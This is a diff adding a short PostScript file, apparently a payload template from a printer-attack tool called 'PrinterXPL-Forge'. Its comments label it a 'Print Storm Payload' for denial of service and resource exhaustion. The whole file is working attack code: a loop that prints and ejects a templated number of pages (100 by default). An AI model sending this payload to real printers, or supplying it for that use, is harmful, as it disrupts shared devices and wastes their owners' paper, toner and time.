@@ -1,0 +1,14 @@
+%!PS
+% PrinterXPL-Forge Print Storm Payload
+% Prints many pages rapidly (DoS/resource exhaustion)
+% Pages: {{count}} (default: 100)
+
+/Helvetica findfont 24 scalefont setfont
+0 1 {{count}} {
+    dup
+    100 700 moveto
+    (PrinterXPL-Forge STORM - Page ) show
+    20 string cvs show
+    showpage
+} for
+
